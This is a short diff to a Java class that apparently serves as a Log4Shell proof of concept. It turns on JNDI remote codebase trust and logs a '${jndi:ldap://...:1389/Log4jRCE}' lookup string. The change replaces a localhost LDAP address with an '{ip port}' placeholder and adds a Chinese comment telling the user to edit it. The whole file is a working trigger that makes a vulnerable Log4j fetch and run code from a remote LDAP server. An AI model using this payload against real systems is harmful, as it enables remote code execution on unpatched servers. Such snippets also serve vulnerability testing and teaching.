@@ -7,6 +7,6 @@ public class log4j {
 
     public static void main(String[] args) {
         System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
-        logger.error("${jndi:ldap://127.0.0.1:1389/Log4jRCE}");
+        logger.error("${jndi:ldap://{ip port}:1389/Log4jRCE}"); //这里注意修改！
     }
 }
